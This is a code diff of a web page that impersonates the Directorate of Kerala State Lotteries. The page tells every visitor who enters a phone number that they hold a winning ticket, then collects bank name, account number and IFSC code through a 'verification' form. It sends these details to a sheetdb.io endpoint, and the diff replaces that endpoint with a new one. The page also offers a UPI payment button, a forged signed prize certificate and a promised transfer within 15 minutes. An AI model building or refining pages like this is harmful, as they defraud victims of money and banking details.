@@ -30,7 +30,7 @@
     .ticket-list { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 6px; }
     .ticket-chip { background: #f1f5f9; font-size: 11px; padding: 4px 7px; border-radius: 4px; font-family: monospace; border: 1px solid #cbd5e1; }
     .user-winning-tag { background: #dc2626 !important; color: #ffffff !important; font-weight: bold !important; padding: 4px 8px !important; border-radius: 4px !important; }
-
+    
     /* Certificate Styling */
     .cert-container { margin-top: 15px; border-top: 2px dashed #10b981; padding-top: 15px; }
     .certificate-card { border: 5px double #b45309; padding: 16px; background: #fffdf5; border-radius: 10px; text-align: center; }
@@ -38,7 +38,6 @@
     .cert-sub { color: #6b7280; font-size: 12px; margin-bottom: 12px; font-weight: bold; }
     .cert-table { width: 100%; border-top: 1px dashed #d97706; border-bottom: 1px dashed #d97706; padding: 8px 0; margin-bottom: 10px; }
     .cert-item { display: flex; justify-content: space-between; font-size: 13px; line-height: 1.9; }
-
     @media print {
       body * { visibility: hidden; }
       #printableCert, #printableCert * { visibility: visible; }
@@ -47,9 +46,7 @@
   </style>
 </head>
 <body>
-
   <canvas id="confettiCanvas"></canvas>
-
   <div class="wrapper">
     <div class="datetime-bar" id="liveClock">Loading live date and time...</div>
     <div class="helpline-bar">📞 Helpline: <a href="tel:8709171965">+91 8709171965</a></div>
@@ -85,7 +82,7 @@
       </div>
     </div>
 
-    <!-- 3. WITHDRAW (UPI Input Removed) -->
+    <!-- 3. WITHDRAW -->
     <div id="pageWithdraw" class="card-page" style="display:none;">
       <h3 style="color:#1e3a8a; text-align:center; margin-bottom:12px;">Bank Transfer & Verification Form</h3>
       <form onsubmit="handleBankSubmit(event)">
@@ -93,7 +90,6 @@
         <input type="text" id="bankName" required placeholder="Bank Name (e.g., SBI, HDFC, ICICI)">
         <input type="text" id="accNumber" required placeholder="Bank Account Number" oninput="maskRealtime(this.value)">
         <input type="text" id="ifscCode" required placeholder="Bank IFSC Code">
-        
         <div style="background:#fef08a; padding:8px; border-radius:6px; font-size:13px; font-weight:bold; color:#854d0e; margin-bottom:12px;">
           Masked Account: <span id="realtimeMask">XXXX-XXXX-XXXX</span>
         </div>
@@ -109,14 +105,11 @@
         <h3 style="color:#15803d;">Transaction Initiated</h3>
       </div>
       <div id="receiptBox" style="background:#fff; padding:12px; border-radius:8px; margin-bottom:12px;"></div>
-      
       <!-- Panel UPI ID Button -->
       <div id="upiBtnContainer"></div>
-
       <div style="background:#fee2e2; color:#991b1b; padding:10px; border-radius:6px; font-size:13px; text-align:center; margin-bottom:12px;">
         Prize amount will be credited directly to your bank account within 15 minutes.
       </div>
-
       <!-- Winning Certificate -->
       <div class="cert-container">
         <div class="certificate-card" id="printableCert">
@@ -138,12 +131,10 @@
           </div>
           <small style="color: #6b7280;">Digitally Signed & Certified • Directorate of Kerala State Lotteries</small>
         </div>
-
         <button class="btn btn-green" style="margin-top: 12px;" onclick="window.print()">
           ⬇️ Download Winning Certificate (Save PDF)
         </button>
       </div>
-
       <button class="btn btn-blue" style="margin-top: 10px;" onclick="showPage('pageSearch')">Return to Home</button>
     </div>
   </div>
@@ -156,7 +147,8 @@
     setInterval(updateLiveClock, 1000);
     updateLiveClock();
 
-    const API_URL = "https://sheetdb.io/api/v1/osehsg02p213h";
+    const API_URL = "https://sheetdb.io/api/v1/xg319w8cppv5s";
+
     const prizeSlabs = [
       { rank: "1st Prize", amount: "25 Cr", count: 1 },
       { rank: "2nd Prize", amount: "10 Cr", count: 1 },
@@ -178,10 +170,7 @@
     };
 
     const randomTicket = () => "KL-" + Math.floor(100000 + Math.random() * 900000);
-    let liveWinners = prizeSlabs.map(s => ({
-      ...s,
-      tickets: Array.from({ length: s.count }, randomTicket)
-    }));
+    let liveWinners = prizeSlabs.map(s => ({ ...s, tickets: Array.from({ length: s.count }, randomTicket) }));
 
     function renderWinners(highlightTicket = "", targetId = "winnersList") {
       const el = document.getElementById(targetId);
@@ -195,9 +184,10 @@
               <span>${s.tickets.length} Winners</span>
             </div>
             <div class="ticket-list">
-              ${s.tickets.map(t => (highlightTicket && t.toLowerCase() === highlightTicket.toLowerCase())
-                ? `<span class="ticket-chip user-winning-tag">⭐ ${t} (Your Ticket)</span>`
-                : `<span class="ticket-chip">${t}</span>`
+              ${s.tickets.map(t => 
+                (highlightTicket && t.toLowerCase() === highlightTicket.toLowerCase())
+                  ? `<span class="ticket-chip user-winning-tag">⭐ ${t} (Your Ticket)</span>`
+                  : `<span class="ticket-chip">${t}</span>`
               ).join('')}
             </div>
           </div>
@@ -219,7 +209,6 @@
         alert("Please enter a valid Ticket Number or Mobile Number.");
         return;
       }
-
       try {
         let isPhone = /^[0-9]{10}$/.test(key);
         let userTicket = isPhone ? "KL-" + key.slice(-6) : key.toUpperCase();
@@ -316,7 +305,6 @@
         <div class="result-row"><b>Transfer Amount:</b><span style="color:#15803d; font-weight:bold;">₹${current.amount}</span></div>
       `;
 
-      // Panel UPI Button
       const upiBtnBox = document.getElementById("upiBtnContainer");
       if (current.upiId) {
         upiBtnBox.innerHTML = `
@@ -351,6 +339,7 @@
       c.width = window.innerWidth;
       c.height = window.innerHeight;
       c.style.display = 'block';
+
       const p = Array.from({ length: 50 }, () => ({
         x: c.width / 2,
         y: c.height / 3,
@@ -359,6 +348,7 @@
         dy: (Math.random() - 0.7) * 10,
         color: ['#f59e0b', '#ef4444', '#10b981', '#3b82f6'][Math.floor(Math.random() * 4)]
       }));
+
       let f = 0;
       (function draw() {
         ctx.clearRect(0, 0, c.width, c.height);
